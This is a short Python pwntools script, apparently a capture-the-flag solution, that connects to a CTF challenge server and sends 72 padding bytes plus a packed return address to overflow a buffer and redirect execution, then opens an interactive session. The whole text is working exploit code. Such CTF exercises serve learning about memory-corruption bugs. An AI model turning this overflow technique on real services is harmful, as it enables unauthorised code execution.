from pwn import *

io = remote('challs.n00bzunit3d.xyz', 35932)

io.recvuntil(b'flag?\n')
io.sendline(b'i'*72 + p64(0x40124a))
io.interactive()